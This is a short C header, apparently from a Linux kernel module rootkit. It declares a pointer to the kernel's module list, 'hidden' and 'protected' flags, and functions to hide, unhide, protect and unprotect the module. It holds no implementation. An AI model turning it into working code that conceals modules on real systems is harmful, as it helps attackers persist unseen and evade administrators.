#ifndef HIDE_H
#define HIDE_H

#include "lib.h"

extern struct list_head *module_list;
extern int is_hidden;
extern int is_protected;

void my_hide(void);

void my_unhide(void);

void my_protect(void);

void my_unprotect(void);

#endif